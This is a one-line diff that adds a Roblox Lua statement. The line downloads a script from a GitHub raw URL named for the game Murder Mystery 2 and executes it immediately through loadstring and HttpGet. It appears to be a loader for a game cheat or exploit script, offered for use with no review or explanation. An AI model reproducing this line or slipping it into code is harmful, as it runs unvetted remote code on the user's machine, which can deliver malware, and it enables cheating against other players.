@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TKyoka/EthosX/refs/heads/main/Murder%20Mystery%202"))()
